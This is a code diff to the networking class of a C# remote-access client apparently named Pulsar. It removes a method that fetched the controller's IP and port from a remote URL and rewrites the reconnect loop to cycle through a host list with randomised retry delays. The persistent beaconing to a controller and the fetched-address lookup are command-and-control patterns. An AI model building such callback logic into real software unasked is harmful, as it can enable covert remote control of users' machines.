@@ -1,21 +1,18 @@
-using Pulsar.Client.Config;
+using NAudio.CoreAudioApi;
 using Pulsar.Client.Helper;
 using Pulsar.Client.IO;
 using Pulsar.Client.IpGeoLocation;
 using Pulsar.Client.User;
 using Pulsar.Common.DNS;
 using Pulsar.Common.Helpers;
+using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Messages;
-using Pulsar.Common.Messages.other;
 using Pulsar.Common.Utilities;
+using Pulsar.Client.Config;
 using System;
 using System.Diagnostics;
-using System.IO;
-using System.Net;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
-
-
 
 namespace Pulsar.Client.Networking
 {
@@ -46,9 +43,6 @@ namespace Pulsar.Client.Networking
         /// </summary>
         private readonly CancellationToken _token;
 
-        // Store the last resolved host (IP and Port)
-        private Host _lastResolvedHost;
-
         /// <summary>
         /// Initializes a new instance of the <see cref="PulsarClient"/> class.
         /// </summary>
@@ -71,46 +65,37 @@ namespace Pulsar.Client.Networking
         /// </summary>
         public void ConnectLoop()
         {
+            // TODO: do not re-use object
             while (!_token.IsCancellationRequested)
             {
                 if (!Connected)
                 {
-                    Host host = null;
-                    string hostString = Settings.HOSTS;
+                    Host host = _hosts.GetNextHost();
 
-                    if (!string.IsNullOrEmpty(hostString))
+                    if (host == null || host.IpAddress == null)
                     {
-                        host = ResolveHost(hostString);
-                    }
-
-                    if (host == null)
-                    {
-                        host = _hosts.GetNextHost();
+                        Debug.WriteLine("Failed to get a valid host to connect to. Will retry after delay.");
+                        Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
+                        continue;
                     }
 
                     try
                     {
                         base.Connect(host.IpAddress, host.Port);
-
-                        if (!Connected)
-                        {
-                            continue;
-                        }
                     }
                     catch (Exception ex)
                     {
-                        Debug.WriteLine($"Connection error: {ex.Message}");
-                        continue;
+                        Debug.WriteLine($"Connection attempt failed: {ex.Message}");
                     }
                 }
 
-                while (Connected && !_token.IsCancellationRequested)
+                while (Connected)
                 {
                     try
                     {
-                        _token.WaitHandle.WaitOne(250);
+                        _token.WaitHandle.WaitOne(1000);
                     }
-                    catch (Exception ex) when (ex is NullReferenceException || ex is ObjectDisposedException)
+                    catch (Exception e) when (e is NullReferenceException || e is ObjectDisposedException)
                     {
                         Disconnect();
                         return;
@@ -122,83 +107,10 @@ namespace Pulsar.Client.Networking
                     Disconnect();
                     return;
                 }
+
+                Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
             }
         }
-
-        /// <summary>
-        /// Keeps only one ResolveHost method with logging capabilities
-        /// </summary>
-        private Host ResolveHost(string hostString)
-        {
-            try
-            {
-                if (Uri.TryCreate(hostString, UriKind.Absolute, out Uri uri))
-                {
-                    try
-                    {
-                        WebRequest request = WebRequest.Create(uri);
-                        request.Timeout = 5000;
-                        using (WebResponse response = request.GetResponse())
-                        using (Stream stream = response.GetResponseStream())
-                        using (StreamReader reader = new StreamReader(stream))
-                        {
-                            string content = reader.ReadToEnd().Trim();
-                            Debug.WriteLine($"Fetched from URI: '{content}'");
-
-                            if (Uri.TryCreate(content, UriKind.Absolute, out Uri nestedUri))
-                            {
-                                return ResolveHost(content); 
-                            }
-
-                            string[] parts = content.Split(':');
-                            if (parts.Length >= 2 &&
-                                IPAddress.TryParse(parts[0].Trim(), out IPAddress ip) &&
-                                ushort.TryParse(parts[1].Trim(), out ushort port))
-                            {
-                                Debug.WriteLine($"Parsed IP: {ip}, Port: {port}");
-                                _lastResolvedHost = new Host { IpAddress = ip, Port = port };
-                                return _lastResolvedHost;
-                            }
-                            else
-                            {
-                                Debug.WriteLine($"Failed to parse URI response: '{content}'");
-                            }
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"URI fetch error: {ex.Message}");
-                    }
-                }
-                else
-                {
-                    string[] parts = hostString.Split(':');
-                    if (parts.Length >= 2 &&
-                        IPAddress.TryParse(parts[0].Trim(), out IPAddress ip) &&
-                        ushort.TryParse(parts[1].Trim(), out ushort port))
-                    {
-                        Debug.WriteLine($"Parsed direct IP: {ip}, Port: {port}");
-                        _lastResolvedHost = new Host { IpAddress = ip, Port = port };
-                        return _lastResolvedHost;
-                    }
-                    else
-                    {
-                        Debug.WriteLine($"Invalid hostString format: '{hostString}'");
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                Debug.WriteLine($"Host resolution error: {ex.Message}");
-            }
-            if (_lastResolvedHost != null)
-            {
-                Debug.WriteLine($"Using last resolved host: {_lastResolvedHost.IpAddress}:{_lastResolvedHost.Port}");
-                return _lastResolvedHost;
-            }
-            return null;
-        }
-
 
         private void OnClientRead(Client client, IMessage message, int messageLength)
         {
@@ -217,7 +129,7 @@ namespace Pulsar.Client.Networking
 
         private void OnClientFail(Client client, Exception ex)
         {
-            Debug.WriteLine("Client Failed: " + ex.Message);
+            Debug.WriteLine("Client Fail - Exception Message: " + ex.Message);
             client.Disconnect();
         }
 
